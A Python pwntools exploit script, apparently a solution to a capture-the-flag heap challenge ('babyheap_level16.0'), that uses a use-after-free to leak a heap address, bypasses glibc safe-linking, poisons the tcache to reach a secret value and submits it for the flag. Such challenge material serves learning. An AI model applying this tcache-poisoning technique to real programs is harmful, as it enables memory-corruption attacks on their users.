#!/usr/bin/env python3

from pwn import * 
import time
binary = './babyheap_level16.0_patched'
p = process(binary)

s = '''
b malloc
b free
'''

#gdb.attach(p, s)

#context.log_level = 'debug'

# parsing the address leak 


p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline("free 0")
p.sendline("free 1")

# uaf
# overwriting the next* pointer with address of secret -- 0x42a528

p.sendline("puts 0")
p.recvuntil("Data: ")
leak = p.recvline().strip()
print("leak: ", leak)
leak = u64(leak.ljust(8, b'\x00'))
leak = leak << 12
print(hex(leak))




addr = 0x00434fd0 
chunk_addr = leak + 0x2c0

mangled_ptr = ((chunk_addr >> 12 ) ^ (addr))


p.sendline(b"scanf")
p.sendline("1")
p.sendline(p64(mangled_ptr)) # 8 bytes before destination



p.sendline("malloc 1 100")





p.sendline("malloc 0 100")


p.sendline("free 1")


p.sendline("puts 1")




p.recvuntil(b"Data: ")
leak = p.recvline().strip() 

print(leak)

value = u64(leak[:8])
#value = u64(leak.ljust(8, b'\x00'))

# Print the value in different formats
print(f"Leaked value (decimal): {value}")
print(f"Leaked value (hex): 0x{value:x}")

string_value = leak.decode('latin-1')  # Use latin-1 or 'ascii' with errors='ignore'
print(f"Leaked string: {string_value}")



demangled_ptr = (((chunk_addr + 0x70) >> 12) ^ value)
demangled_ptr = (( 0x00434fd0 >> 12 ) ^ demangled_ptr)

string_value = p64(demangled_ptr).decode('latin-1') 


print(hex(demangled_ptr))
print(string_value)




print(demangled_ptr)



time.sleep(1)



p.sendline(b"send_flag")
time.sleep(1)
p.recvuntil(b"Secret: ")
p.sendline(p64(demangled_ptr) + b'\x00' * 8)

#gdb.attach(p, s)
p.interactive()





